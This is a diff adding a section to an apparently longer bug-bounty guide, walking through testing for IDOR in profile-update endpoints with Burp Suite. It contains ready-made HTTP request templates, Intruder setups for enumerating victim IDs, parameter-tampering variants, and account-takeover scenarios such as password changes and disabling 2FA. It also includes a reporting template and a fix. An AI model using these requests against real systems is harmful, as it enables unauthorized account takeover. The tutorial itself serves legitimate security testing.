@@ -4127,3 +4127,561 @@ Ctrl+F    - Search in response
 
 ---
 
+# 🔍 **Bug #8: IDOR in Profile Update - Full Burp Suite Methodology**
+
+## 📌 **Bug Description**
+**IDOR in Profile Update** - Modifying other users' profile information by manipulating user identifiers during profile update operations.
+
+---
+
+## 🎯 **Vulnerability Overview**
+When a user updates their profile, the application uses a user ID parameter to identify which profile to update. If proper authorization checks aren't performed, an attacker can modify this ID to update other users' profiles.
+
+---
+
+## 🛠️ **Complete Burp Suite Methodology**
+
+### **PHASE 1: RECONNAISSANCE & MAPPING**
+
+#### **Step 1: Map Profile Update Functionality**
+```
+1. Login with User A (attacker account)
+2. Navigate to Profile Settings / Edit Profile
+3. Turn on Burp Intercept
+4. Update any profile field (name, email, bio, etc.)
+5. Capture the request
+```
+
+**Typical endpoints to look for:**
+```
+POST /profile/update
+POST /api/user/update
+POST /edit-profile
+PUT /user/{id}
+PATCH /profile
+POST /account/settings
+POST /update-profile.php
+```
+
+#### **Step 2: Identify ID Parameters**
+Look for parameters that might identify the user:
+
+**Common Parameter Names:**
+```
+user_id
+uid
+userId
+profile_id
+account_id
+id
+user
+account
+profile
+member_id
+userid
+userID
+profileId
+accountId
+```
+
+**Example captured request:**
+```
+POST /profile/update HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+Content-Type: application/x-www-form-urlencoded
+
+user_id=100&name=attacker&email=attacker@evil.com&bio=test
+```
+
+---
+
+### **PHASE 2: BURP SUITE CONFIGURATION**
+
+#### **Step 3: Send to Burp Intruder**
+1. Right-click on the request → **Send to Intruder**
+2. Go to **Intruder** tab
+
+#### **Step 4: Configure Attack Positions**
+```
+Clear all payload positions first (Ctrl+A, then Clear §)
+
+Select the user identifier value and mark it:
+POST /profile/update HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+
+user_id=§100§&name=attacker&email=attacker@evil.com&bio=test
+```
+
+#### **Step 5: Set Attack Type**
+Choose **Sniper** attack (testing one parameter at a time)
+
+---
+
+### **PHASE 3: PAYLOAD CONFIGURATION**
+
+#### **Step 6: Create Target User List**
+Generate potential victim IDs:
+
+**Method A - Numbers (Sequential):**
+1. Go to **Payloads** tab
+2. **Payload Options** → Add from list
+3. Generate numbers:
+   - Start: 1
+   - End: 200
+   - Step: 1
+
+**Method B - Numbers (Known pattern):**
+If you have User B's ID (e.g., 105):
+```
+Add specific numbers:
+101 (just before victim)
+102
+103
+104
+105 (victim)
+106
+107
+108
+109
+110
+```
+
+**Method C - Custom wordlist:**
+Create a list in Burp:
+```
+1
+2
+3
+... (known IDs from other responses)
+```
+
+#### **Step 7: Configure Payload Processing (Advanced)**
+If IDs are encoded:
+
+**For Base64:**
+1. Payload Processing → Add
+2. Encode → Base64-encode
+
+**For URL Encoding:**
+1. Payload Processing → Add
+2. Encode → URL-encode all characters
+
+**For JSON format:**
+```
+Raw payload: 100
+After processing: {"user_id":"100"}
+```
+
+#### **Step 8: Set Request Engine**
+- **Threads:** 5-10 (don't overwhelm server)
+- **Throttle:** 0-100ms between requests
+- **Retries:** 0-1
+
+---
+
+### **PHASE 4: ATTACK EXECUTION**
+
+#### **Step 9: Start the Attack**
+Click **Start Attack** button
+
+#### **Step 10: Monitor Attack Progress**
+Watch for:
+- **Status codes**: 200 vs 403 vs 500
+- **Response length**: Different lengths may indicate success
+- **Response times**: Unusual delays
+
+---
+
+### **PHASE 5: RESPONSE ANALYSIS**
+
+#### **Step 11: Identify Successful IDORs**
+
+**Indicators of Success:**
+
+**A. Status Code Analysis**
+```
+Status 200 OK → Possible success
+Status 302 Found → Redirect after update
+Status 403 Forbidden → Access denied (good)
+Status 404 Not Found → Invalid user
+Status 500 Server Error → Potential SQL injection
+```
+
+**B. Response Length Analysis**
+```
+1. Sort results by "Length" column
+2. Look for responses with SAME length as your original
+3. Look for responses with DIFFERENT lengths
+4. Note: Your own user ID (100) should be baseline
+```
+
+**C. Response Content Analysis**
+```json
+Example of successful response:
+{
+  "status": "success",
+  "message": "Profile updated",
+  "user": {
+    "id": 105,
+    "name": "attacker",
+    "email": "attacker@evil.com"
+  }
+}
+```
+
+**D. Error Messages**
+```
+"User not found" → ID exists but not accessible
+"Unauthorized" → Good protection
+"Permission denied" → Good protection
+"Profile updated" → BINGO!
+```
+
+---
+
+### **PHASE 6: MANUAL VERIFICATION**
+
+#### **Step 12: Manual Testing with Burp Repeater**
+
+**A. Basic Test:**
+1. Send suspicious request to Repeater (Ctrl+R)
+2. Modify ID to victim's ID
+3. Send request
+4. Analyze response
+
+**B. Verify with User B Login:**
+1. Login as User B (victim)
+2. Check if profile was actually modified
+3. Document proof
+
+#### **Step 13: Test Different HTTP Methods**
+
+**Original:**
+```
+POST /profile/update HTTP/1.1
+user_id=105&name=attacker
+```
+
+**Try variations:**
+```
+PUT /profile/update HTTP/1.1
+user_id=105&name=attacker
+
+PATCH /profile/update HTTP/1.1
+user_id=105&name=attacker
+
+GET /profile/105 HTTP/1.1
+```
+
+#### **Step 14: Test Parameter Locations**
+
+**Move ID to different locations:**
+
+**Query Parameter:**
+```
+POST /profile/update?user_id=105 HTTP/1.1
+name=attacker&email=attacker@evil.com
+```
+
+**JSON Body:**
+```
+POST /profile/update HTTP/1.1
+Content-Type: application/json
+
+{"user_id": 105, "name": "attacker"}
+```
+
+**Cookie:**
+```
+POST /profile/update HTTP/1.1
+Cookie: session=abc123; user_id=105
+name=attacker
+```
+
+**Header:**
+```
+POST /profile/update HTTP/1.1
+X-User-ID: 105
+name=attacker
+```
+
+---
+
+### **PHASE 7: ADVANCED TECHNIQUES**
+
+#### **Step 15: Parameter Pollution Test**
+```
+POST /profile/update HTTP/1.1
+
+user_id=100&user_id=105&name=attacker
+```
+
+#### **Step 16: Array/List Format**
+```
+POST /profile/update HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_ids[]=105&name=attacker
+
+OR
+
+user_ids=100,105,106&name=attacker
+```
+
+#### **Step 17: UUID/GUID Testing**
+If using UUIDs, look for patterns:
+```
+Original: /profile/update?uuid=550e8400-e29b-41d4-a716-446655440000
+Test:     /profile/update?uuid=550e8400-e29b-41d4-a716-446655440001
+```
+
+#### **Step 18: Test for Blind IDOR**
+Sometimes no visible response change, but data updates:
+
+**Technique:**
+1. Modify victim's profile with unique data
+2. Login as victim
+3. Check if data persisted
+
+---
+
+### **PHASE 8: EXPLOITATION & POC**
+
+#### **Step 19: Create Proof of Concept**
+
+**Documentation Template:**
+```
+VULNERABILITY: IDOR in Profile Update
+=====================================
+Target: https://target.com/profile/update
+
+Original Request (Attacker User ID 100):
+----------------------------------------
+POST /profile/update HTTP/1.1
+Host: target.com
+Cookie: session=ATTACKER_SESSION
+Content-Type: application/x-www-form-urlencoded
+
+user_id=100&name=Attacker&email=attacker@evil.com
+
+Exploit Request (Victim User ID 105):
+-------------------------------------
+POST /profile/update HTTP/1.1
+Host: target.com
+Cookie: session=ATTACKER_SESSION
+Content-Type: application/x-www-form-urlencoded
+
+user_id=105&name=HACKED&email=hacked@evil.com
+
+Response:
+---------
+HTTP/1.1 200 OK
+{"status":"success","message":"Profile updated"}
+
+Impact: Attacker can modify ANY user's profile information
+```
+
+#### **Step 20: Automate with Burp Macro (Optional)**
+
+**Create Macro for repeated testing:**
+1. Project Options → Sessions
+2. Add Macro
+3. Record login sequence
+4. Use macro to maintain session
+
+---
+
+## 📊 **Burp Suite Configuration Summary**
+
+### **Intruder Settings:**
+```
+Attack Type: Sniper
+Payloads: Numbers 1-200
+Resource Pool: 5 threads, 0 delay
+Grep - Extract: Response body for success messages
+Grep - Match: "success", "updated", "error", "unauthorized"
+```
+
+### **Repeater Usage:**
+```
+Send suspicious requests here for manual testing
+Use "Search" feature to find specific strings
+Compare responses with "Diff" feature
+```
+
+### **Scanner Checks:**
+1. Enable "Scan for IDOR" in active scan
+2. Add custom insertion points
+3. Use session handling rules
+
+---
+
+## 🚨 **Critical Testing Scenarios**
+
+### **Scenario 1: Email Change IDOR**
+```
+POST /change-email
+user_id=105&new_email=attacker@evil.com
+→ Victim loses account access
+```
+
+### **Scenario 2: Password Change IDOR**
+```
+POST /change-password
+user_id=105&new_pass=Hacked123
+→ Complete account takeover
+```
+
+### **Scenario 3: 2FA Disable IDOR**
+```
+POST /disable-2fa
+user_id=105&confirm=true
+→ Bypass victim's security
+```
+
+### **Scenario 4: Profile Picture Update**
+```
+POST /upload-avatar
+user_id=105&avatar=evil.jpg
+→ Deface victim's profile
+```
+
+---
+
+## 📝 **Reporting Template**
+
+```
+# IDOR Vulnerability in Profile Update Functionality
+
+## Summary
+The profile update endpoint lacks proper authorization checks, allowing any authenticated user to modify any other user's profile information by manipulating the user_id parameter.
+
+## Affected Endpoint
+POST /profile/update
+
+## Vulnerability Type
+Insecure Direct Object Reference (IDOR)
+
+## Steps to Reproduce
+1. Login as attacker (User A: ID 100)
+2. Intercept profile update request
+3. Change user_id parameter from 100 to 105 (victim)
+4. Forward the request
+5. Observe success response
+6. Login as victim (User B) to confirm changes persisted
+
+## Proof of Concept
+[Include screenshots/HTTP requests]
+
+## Impact
+- Unauthorized modification of any user's profile
+- Potential account takeover (if email/password can be changed)
+- Data integrity compromise
+- Privacy violation
+
+## Recommended Fix
+Implement server-side authorization checks:
+```python
+def update_profile(request):
+    user_id = request.POST.get('user_id')
+    # Verify the authenticated user owns this profile
+    if request.user.id != int(user_id):
+        return HttpResponseForbidden()
+    # Proceed with update
+```
+
+## CVSS Score
+7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
+```
+
+---
+
+## 🛡️ **Defense Bypass Techniques**
+
+If initial tests fail, try these:
+
+### **1. Use Valid Victim Session**
+```
+If you have User B's session cookie:
+POST /profile/update
+Cookie: session=VICTIM_SESSION
+user_id=105&name=attacker
+```
+
+### **2. Test After Logout**
+```
+1. Perform update with victim ID
+2. Logout
+3. Check if changes persist
+```
+
+### **3. Test with Different Roles**
+```
+Test with:
+- Regular user → Regular user
+- Regular user → Admin
+- Admin → Regular user
+- User → Different company/tenant
+```
+
+### **4. Time-Based Testing**
+```
+Test IDOR with:
+- Active sessions
+- Expired sessions
+- Different times of day
+```
+
+---
+
+## 🎯 **Common Profile Update Fields to Test**
+
+| Field | Impact Level | Test Priority |
+|-------|--------------|---------------|
+| Email | 🔴 Critical | 1 |
+| Password | 🔴 Critical | 1 |
+| Username | 🟡 Medium | 2 |
+| Full Name | 🟢 Low | 3 |
+| Bio/About | 🟢 Low | 3 |
+| Profile Picture | 🟡 Medium | 2 |
+| Phone Number | 🟡 Medium | 2 |
+| Address | 🟢 Low | 3 |
+| Security Questions | 🔴 Critical | 1 |
+| 2FA Settings | 🔴 Critical | 1 |
+| Privacy Settings | 🟡 Medium | 2 |
+| Notification Settings | 🟢 Low | 3 |
+
+---
+
+## ✅ **Checklist for Bug #8**
+
+- [ ] Identified profile update endpoint
+- [ ] Captured update request
+- [ ] Located user identifier parameter
+- [ ] Configured Burp Intruder
+- [ ] Created payload list
+- [ ] Executed attack
+- [ ] Analyzed responses
+- [ ] Found successful IDOR
+- [ ] Manual verified
+- [ ] Tested different methods
+- [ ] Tested different locations
+- [ ] Documented proof
+- [ ] Created report
+- [ ] Developed fix recommendation
+
+---
+
+## ⚠️ **Important Notes**
+
+1. **Always use test accounts** - Never test on real users
+2. **Monitor rate limiting** - Avoid DoS
+3. **Document everything** - Screenshots, requests, responses
+4. **Verify impact** - Ensure vulnerability is real
+5. **Check scope** - Stay within authorized boundaries
+6. **Responsible disclosure** - Report properly
+
+---
+
